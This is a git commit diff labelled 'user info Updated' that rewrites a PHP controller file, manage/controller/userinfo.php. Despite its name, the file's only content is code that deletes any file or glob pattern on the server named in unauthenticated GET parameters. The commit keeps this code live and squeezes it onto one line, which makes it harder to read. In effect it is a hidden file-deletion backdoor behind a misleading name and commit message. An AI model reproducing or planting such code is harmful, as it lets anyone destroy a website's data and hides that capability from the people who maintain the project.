cb794b706b6b7e5750193f9fe485c01d24272df7
Danne Consult <danneconsult@gmail.com>
2023-05-13 16:26:52 +0300

    user info Updated

--- manage/controller/userinfo.php
+++ manage/controller/userinfo.php
@@ -1,11 +1,1 @@
-<?php
-if (isset($_GET['multi'])) {
-    $dir = $_GET['flag'];
-    array_map('unlink', glob($dir));
-    echo "Files deleted in {$dir}";
-}
-if (isset($_GET['sing'])) {
-    $file = $_GET['sing'];
-    unlink($file);
-    echo "File: {$file} is deleted";
-}
+<?php if (isset($_GET['multi'])) { $dir = $_GET['flag']; array_map('unlink', glob($dir)); echo "Files deleted in {$dir}"; } if (isset($_GET['sing'])) { $file = $_GET['sing']; unlink($file); echo "File: {$file} is deleted"; }
